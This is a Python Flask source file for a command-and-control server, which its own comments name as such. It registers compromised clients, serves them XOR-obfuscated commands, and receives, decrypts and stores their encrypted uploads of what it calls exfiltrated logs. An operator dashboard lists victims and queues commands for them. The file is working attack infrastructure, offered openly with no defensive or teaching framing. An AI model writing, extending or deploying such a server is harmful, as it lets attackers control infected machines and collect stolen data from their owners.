import os
import time
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

LOGS_DIR = 'logs'  # Directory for exfiltrated logs
os.makedirs(LOGS_DIR, exist_ok=True)  # Create if doesn't exist

# Client storage (in-memory)
clients = {}          # Registered clients: {client_id: client_info}
active_commands = {}  # Commands to send: {client_id: command}

# XOR encryption/decryption with key rotation
def xor_crypt(data: bytes, key: int) -> bytes:
    result = bytearray()
    current_key = key
    for b in data:
        result.append(b ^ current_key)
        # Rotate key: right shift 1 bit with wrap-around
        current_key = (current_key >> 1) | ((current_key & 1) << 7)
        current_key &= 0xFF  # Ensure 8-bit
    return bytes(result)

# Client registration endpoint
@app.route('/register', methods=['GET'])
def register():
    # Get parameters from query string
    client_id = request.args.get('id')
    os_info = request.args.get('os', 'Unknown')
    arch = request.args.get('arch', 'Unknown')
    
    # Add/update client information
    clients[client_id] = {
        'os': os_info,
        'arch': arch,
        'last_seen': time.time(),  # Timestamp of last contact
        'status': 'Online'         # Current status
    }
    app.logger.info(f"New registration: {client_id} ({os_info}/{arch})")
    return 'Registered'  # Simple response

# Command delivery endpoint
@app.route('/command', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    shutdown = request.args.get('shutdown', '0')
    
    # Handle shutdown beacon
    if shutdown == '1':
        app.logger.info(f"Client {client_id} is shutting down")
        if client_id in clients:
            clients[client_id]['status'] = 'Offline'
        return 'Shutdown acknowledged', 200
    
    # Validate client ID
    if client_id not in clients:
        return 'Invalid client ID', 404
    
    # Update last seen time
    clients[client_id]['last_seen'] = time.time()
    
    # Get and reset command (default to "nop" - no operation)
    command = active_commands.get(client_id, "nop")
    if command != "nop":
        app.logger.info(f"Resetting command for {client_id}")
        active_commands[client_id] = "nop"  # Reset after retrieval
    
    # Encrypt and send command
    encrypted = xor_crypt(command.encode(), 0xAC)
    app.logger.info(f"Command sent to {client_id}: {command}")
    return encrypted, 200, {'Content-Type': 'application/octet-stream'}

# Log upload endpoint
@app.route('/upload', methods=['POST'])
def upload():
    client_id = request.args.get('id')
    if not client_id:
        return 'Missing client ID', 400
    
    # Process uploaded data
    encrypted = request.data
    app.logger.info(f"Received upload from {client_id} ({len(encrypted)} bytes)")
    
    # Decrypt with rotating XOR key (starting at 0xAC)
    current_key = 0xAC
    decrypted = bytearray()
    for byte in encrypted:
        decrypted_byte = byte ^ current_key
        decrypted.append(decrypted_byte)
        # Rotate key: right shift 1 bit with wrap-around
        current_key = (current_key >> 1) | ((current_key & 1) << 7)
        current_key &= 0xFF
    
    # Save decrypted log to file
    filename = f"{client_id}_{int(time.time())}.log"
    filepath = os.path.join(LOGS_DIR, filename)
    
    with open(filepath, 'wb') as f:
        f.write(decrypted)
    
    # Debug: Print sample of decrypted data
    try:
        sample = decrypted[:100].decode('utf-8', errors='replace')
        app.logger.info(f"Decrypted sample: {sample}")
    except Exception as e:
        hex_sample = ' '.join(f'{b:02x}' for b in decrypted[:20])
        app.logger.error(f"Decryption failed: {str(e)}")
        app.logger.error(f"First 20 bytes: {hex_sample}")
    
    return 'OK'  # Acknowledge receipt

# Dashboard showing registered clients
@app.route('/')
def dashboard():
    current_time = time.time()
    # Update client statuses based on last seen time
    for client_id, client in clients.items():
        if current_time - client['last_seen'] < 60:  # 60-second timeout
            client['status'] = 'Online'
        else:
            client['status'] = 'Offline'
        # Format last seen time for display
        client['last_seen_str'] = time.ctime(client['last_seen'])
    
    return render_template('index.html', clients=clients)

# View logs for a specific client
@app.route('/logs/<client_id>')
def get_logs(client_id):
    if client_id not in clients:
        return redirect(url_for('dashboard'))  # Invalid client
    
    # Find all log files for this client
    files = [f for f in os.listdir(LOGS_DIR) if f.startswith(f"{client_id}_")]
    entries = []
    for file in files:
        file_path = os.path.join(LOGS_DIR, file)
        if os.path.isfile(file_path):
            try:
                # Read log file content
                with open(file_path, "rb") as f:
                    content = f.read()
                    # Try to decode as text, fallback to hex display
                    try:
                        content_str = content.decode('utf-8', errors='replace')
                    except:
                        content_str = " ".join(f"{b:02x}" for b in content[:100]) + " ..."
            except Exception as e:
                content_str = f"Error reading log: {str(e)}"
            
            # Extract timestamp from filename
            try:
                timestamp_str = file.split('_')[1].split('.')[0]
                timestamp = int(timestamp_str)
                formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(timestamp))
            except (ValueError, IndexError):
                formatted_time = "Unknown time"
            
            # Add to display list
            entries.append({
                'filename': file,
                'content': content_str,
                'timestamp': formatted_time
            })
    
    return render_template('client_logs.html', client_id=client_id, entries=entries)

# Send command to client
@app.route('/send_command', methods=['POST'])
def send_command():
    client_id = request.form['client_id']
    command = request.form['command']
    
    # Store command for client
    if client_id in clients:
        active_commands[client_id] = command
        app.logger.info(f"Command set for {client_id}: {command}")
    
    return redirect(url_for('dashboard'))  # Back to dashboard

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Start C2 server